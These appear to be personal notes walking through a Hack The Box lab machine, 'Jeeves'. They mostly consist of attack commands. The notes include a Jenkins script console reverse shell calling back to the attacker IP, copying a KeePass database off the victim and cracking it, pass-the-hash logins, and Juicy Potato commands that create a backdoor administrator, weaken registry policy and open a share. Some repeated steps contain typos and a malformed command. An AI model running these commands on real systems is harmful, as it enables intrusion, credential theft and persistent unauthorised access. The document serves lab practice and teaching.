
Crackmapexec, smbmap, Web Fuzzing, Jenkins, Pass-the-Hash Attack, KeePass, Juicy Potato Privilege Escalation, Alternative Data Streams.
keepass2john, john (John the Ripper)



**Concepts:**
- **Port 445 (SMB):**
  - Port 445 is a network protocol port commonly used for SMB (Server Message Block) communication. It's essential for file and printer sharing on Windows networks.

**Commands:**
1. **Using crackmapexec to Gather Information:**
   - Use `crackmapexec` to gather information about the target machine via SMB.
   ```bash
   crackmapexec smb 10.10.10.63
   ```

2. **Listing Shared Resources with smbmap:**
   - Attempt to list shared network resources on the machine using `smbmap`. An 'Authentication error' indicates the need for valid credentials.
   ```bash
   smbmap -H 10.10.10.63 -u 'null'
   ```

3. **Web Fuzzing with wfuzz:**
   - As SMB is exposed, explore web services on port 50000 using `wfuzz`.
   ```bash
   wfuzz -c --hc=404 -t 200 -w /wordlist -u http://10.10.10.63:50000/FUZZ
   ```

4. **Discovering Jenkins and Scripting:**
   - Identify an exposed Jenkins instance, known to be vulnerable due to enabled script consoles.
   - Exploit it to gain access.
   ```bash
   # On your machine
   smbserver smbFolder $(pwd) -smb2support
   # On the victim machine (execute in Jenkins script console)
   println "\\\\10.10.14.2\\smbFolder\\nc64.exe -e cmd 10.10.14.2 1234".execute().text
   # Back on your machine
   rlwrap nc -nlvp 1234
   ```

5. **Privilege Escalation - Finding a KeePass File:**
   - While examining user directories, find a .kdbx file, likely from KeePass.
   - Transfer it to your machine using your shared folder.
   ```bash
   # Victim machine
   copy CEH.kdbx \\10.10.14.8\smbFolder\CEH.kdbx
   ```

6. **Cracking KeePass Password:**
   - Use `keepass2john` to extract the password hash from the KeePass file.
   - Crack the hash using John the Ripper with a wordlist.
   ```bash
   keepass2john CEH.kdbx > hash
   john --wordlist=../../../wordlist/rockyou.txt hash
   ```

7. **Pass-the-Hash Attack:**
   - Verify if the cracked hash belongs to the 'Administrator' using `crackmapexec`. If it returns 'Pwn3d!,' it's valid.
   ```bash
   crackmapexec smb 10.10.10.63 -u 'Administrator' -H ':hash' -d jeeves.local
   ```

8. **Using psexec for Access:**
   - Exploit the pass-the-hash vulnerability with `psexec` to gain access as the Administrator.
   ```bash
   psexec WORKGROUP/Administrator@10.10.10.63 -hashes :hash
   ```

9. **Alternative Method - Privilege Check:**
   - Check the user's privileges using `whoami /priv`. If the user has 'SeImpersonatePrivilege,' consider using Juicy Potato.

10. **Juicy Potato Privilege Escalation:**
    - Download Juicy Potato and transfer it to the victim machine using your shared folder. https://github.com/ohpe/juicy-potato/releases/tag/v0.1
    ```bash
    # On your machine
    smbserver smbFolder $(pwd) -smb2support
    copy \\10.10.14.29\smbFolder\juicypotato.exe jp.exe
    ```
    - Execute Juicy Potato to create a new user with administrator privileges.
    ```bash
    jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user kvzlx Skinheadoi1216@ /add" -l 1337
    JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators" -l 1337
    jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
    jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
    ```
    - Confirm the user's validity with `crackmapexec`.
    ```bash
    crackmapexec smb 10.10.10.63 -u 'kvzlx' -H 'Skinheadoi1216@'
    ```
11. **Access with the New User:**
    - Use `psexec` to access the system with the new user.
    ```bash
    psexec WORKGROUP/kvzlx@10.10.10.63 cmd.exe
    ```

12. **Root Flag Retrieval:**
    - To obtain the root flag, explore alternative data streams using the `dir /r /s` command.
    - View the flag with `more < hm.txt:root.txt`.

**Explanation of "Alternative Data Streams":**
In Windows, alternative data streams are a feature that allows files to have additional data attached to them beyond their main content. This feature is often used for legitimate purposes, but it can also be exploited by attackers to hide information or execute malicious code.

user e3232272596fb47950d59c4cf1e7066a
root afbc5bd4b615a60648cec41c6ac92530


```bash
*Video*

If you are compromising a Windows machine Check the user's privileges using "whoami /priv". 
If the user has 'SeimpersonatePrivilege', consider using Juicy Potato.  
  
- Download Juicy Potato and transfer it to the victim machine using your shared folder.  
  With Impacket-smbserver, we create a network-level shared resource identified by the name you choose, which is synchronized with the current working directory and supports SMB version 2

   impacket-smbserver smbJuicy $(pwd) -smb2support  
  
[#On](https://www.linkedin.com/feed/hashtag/?keywords=on&highlightedUpdateUrns=urn%3Ali%3Aactivity%3A7104799306024382465) 
Now, on the victim machine, we copy Juicy Potato using the previously created shared resource.
   copy \\your_ip\smbJuicy\JuicyPotato.exe JuicyPotato.exe  
  
- Execute Juicy Potato to create a new user with administrator privileges.  
- Utilize Juicy Potato with the "-t *" parameter to employ "CreateProcessWithTokenW and CreateProcessAsUser."
	- Employ the "-p" parameter to specify that you want to yudalaz "cmd" to execute a command and control the desaierd command.
- Use the "-a" parameter to pass the command you wish to execute as an argument.
- In this case, the desired command is "net user" to create a new user on the system.
  
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user kvzlx potato1234@ /add" -l 1337  

- ANext, add the new user to the local administrators group on the machine using "net localgroup.
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators kvzlx /add" -l 1337

- Now, modify the "LocalAccountTokenFilterPolicy" registry entry.
  JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337  

- Finally, ensure everything works by creating a network-level shared resource and granting full privileges to all users in the administrators group over this shared resource that you've created.
  
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  
  
- Confirm the user's validity with `crackmapexec`.  
  
   crackmapexec smb  10.10.10.63-u 'kvzlx' -H 'potato1234@'  
  
- Use `psexec` to access the system with the new user.  
   psexec WORKGROUP/kvzlx@10.10.10.63 cmd.exe

```